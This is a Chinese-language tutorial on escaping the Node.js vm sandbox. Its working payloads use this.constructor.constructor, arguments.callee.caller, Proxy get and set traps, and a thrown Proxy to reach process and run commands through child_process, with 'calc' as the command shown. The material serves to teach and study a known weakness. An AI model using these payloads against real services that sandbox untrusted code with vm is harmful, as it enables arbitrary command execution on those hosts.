## NodeJs vm沙箱逃逸

### 沙箱基本概念

> 沙箱是一种安全机制，为运行中的程序提供的隔离环境。通常是作为一些来源不可信、局破坏力或无法判断程序意图的程序提供实验使用
>
> nodejs提供了vm模块来创建一个隔离环境运行不受信任的代码。但是vm模块并不被推荐使用，因为存在逃逸的风险

### vm模块的使用

- **vm.createContext([sandbox])**

将一个沙箱对象作为参数传递给该方法，如果没有参数，默认创建一个空的沙箱对象，沙箱对象不能访问`global`中的属性

- **vm.runInThisContext(code)**

在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行

这里需要注意的就是`runInThisContext`虽然是会创建相关的沙箱环境，可以访问到`global`上的全局变量，但是访问不到自定义的变量

![image-20240326140438566](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240326140438566.png)

```javascript
const vm = require('vm');

sx = {
    'name': 'chiling',
    'age': 18
}

// context = vm.createContext(sx)
const result = vm.runInThisContext(`process.mainModule.require('child_process').exec('calc')`);
// console.log(result)
```

这里可以给它传递沙箱对象，也可以不传递

- **vm.runInContext(code, contextifiedSandbox,[options])**

参数为要`执行的代码`和创建完作用域的`沙箱对象`，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同

**runInContext一定需要createContext创建的沙箱来进行配合运行**

```javascript
const vm = require('vm');

const sandbox = {
};

const context = vm.createContext(sandbox);
const code = 'this.constructor.constructor("return process")();';
const res = vm.runInContext(code, context);
res.mainModule.require('child_process').exec('calc');
```

`this.constructor.constructor`获取`[Function: Function]`得到沙箱外的对象，返回`process`对象，然后用`child_process`进行代码执行

- **vm.runInNewContext(context,code)**

执行的效果相当于createContext和runInContext，`context`可以不进行提供（默认生成一个context）

```javascript
const vm = require('vm');

const code = 'this.constructor.constructor("return process")();';
const res = vm.runInNewContext(code);
console.log(res.mainModule.require("child_process").exec('calc'));
```

### 沙箱逃逸原理

主要就是获取一个沙箱外的对象

介绍一下`this.constructor.constructor("return process")();`是什么意思？

> `this`代表当前调用该函数的对象
>
> 浏览器环境/全局环境下使用`this指向window对象`

![image-20240326142944198](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240326142944198.png)

`this.constructor.constructor`获取到`Function`

```javascript
function Foo() {
    name: 123
};

const a = new Foo();

console.log(a.constructor);//[Function: Foo]
console.log(a.constructor.constructor);//[Function: Function]
```

### 沙箱逃逸绕过Object.create(null)

将sandbox对象设置为null，`this.constructor`获取不到对象

```javascript
const vm = require("vm");

const sandbox = Object.create(null);

vm.createContext(sandbox);

const code = "this.constructor.constructor('return process')().env";
console.log(vm.runInContext(code,sandbox));
```

![image-20240326144813664](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240326144813664.png)

`arguments.callee.caller`来进行绕过

`arguments.callee`是`arguments`对象的一个成员，它的值为"正被执行的Function对象"

```javascript
function foo() {
    console.log(arguments.callee);//[Function: foo]
}
foo();
```

`caller`是函数的调用者

```javascript
function foo() {
    console.log(arguments.callee.caller);//[Function (anonymous)]
}
foo();
```

如

```javascript
function foo() {
    child()
}

function child() {
    console.log(arguments.callee.caller);
}
foo() //[Function: foo]
```

获取的就是child的调用者foo

我们在沙箱内定义一个函数，在沙箱外访问，那么`arguments.callee.caller`就获得一个沙箱外的对象

```javascript
const vm = require('vm');
const func =
    `(() => {
    const a = {}
    a.toString = function () {
      const cc = arguments.callee.caller;
      const p = (cc.constructor.constructor('return process'))();
      return p.mainModule.require('child_process').exec('calc').toString()
    }
    return a
  })()`;

const sandbox = Object.create(null);
const context = new vm.createContext(sandbox);
const res = vm.runInContext(func, context);
console.log("" + res);
```

在func里重写了`toString`方法，`console.log("" + res);`利用字符串拼接触重写后的`toString`方法

如果我们无法通过字符串的操作来触发toString()，而且无法进行重写一些函数，可以利用`Proxy`来劫持属性

```
let proxy = new Proxy(target, handler)
```

- `target` —— 是要包装的对象，可以是任何东西，包括函数。
- `handler` —— 代理配置：带有“钩子”（“traps”，即拦截操作的方法）的对象。比如 `get` 钩子用于读取 `target` 属性，`set` 钩子写入 `target` 属性等等。

`get`钩子,读取`target`的属性，当使用`target`的属性时，会被触发

```javascript
let numbers = [0, 1, 2];

numbers = new Proxy(numbers, {
    get(target, prop) {
        if (prop in target) {
            return target[prop];
        } else {
            return 0; // 默认值
        }
    }
});

console.log((numbers[1]));// 1
console.log(numbers); //[ 0, 1, 2 ]
console.log((numbers[11]));// 0
```

`set`钩子,写入 `target` 属性,当写入属性时，set钩子触发

```javascript
let numbers = [];

numbers = new Proxy(numbers, {
    set(target, prop, val) {
        if (typeof val == 'number') {
            target[prop] = val;
            return true;
        } else {
            return false;
        }
    }
});

numbers.push(1);
numbers.push(2);
console.log(numbers.length);// 2
console.log(numbers);
numbers.push("test"); // TypeError
```

`numbers.push("test");`我们这里push了一串字符串，于是拦截返回false

利用`get`钩子,进行命令执行，无论访问`res`的任意属性，`get钩子`都会触发

```javascript
const vm = require("vm");

const script =
    `new Proxy({}, {
        get: function(){
            const cc = arguments.callee.caller;
            const p = (cc.constructor.constructor('return process'))();
            return p.mainModule.require('child_process').exec('calc');
        }
    })
`;
const sandbox = Object.create(null);
const context = new vm.createContext(sandbox);
const res = vm.runInContext(script, context);
console.log(res.aa)
```

利用set钩子

```javascript
const vm = require("vm");

const func =
    `new Proxy({}, {
        set: function(my,key, value) {
        (value.constructor.constructor('return process'))().mainModule.require('child_process').execSync('calc').toString()
    }
})`;
const sandbox = Object.create(null);
const context = new vm.createContext(sandbox);
const res = vm.runInContext(func, context);
res['']={};
```

异常抛出利用

```javascript
const vm = require("vm");

const script =
    `
    throw new Proxy({}, {
        get: function(){
            const cc = arguments.callee.caller;
            const p = (cc.constructor.constructor('return process'))();
            return p.mainModule.require('child_process').execSync('calc').toString();
        }
    })
`;
const sandbox = Object.create(null);
const context = vm.createContext(sandbox)
try{
    const res = vm.runInContext(script,context)
}catch (e) {
    console.log("" + e)
}
```

参考

[NodeJs vm沙箱逃逸](https://xz.aliyun.com/t/13427?time__1311=mqmxnDBQqeu4lxGg2Dy07ei%3DDk7GOKijeD&alichlgref=https%3A%2F%2Fxz.aliyun.com%2Fsearch%3Fkeyword%3Dnodejs#toc-1)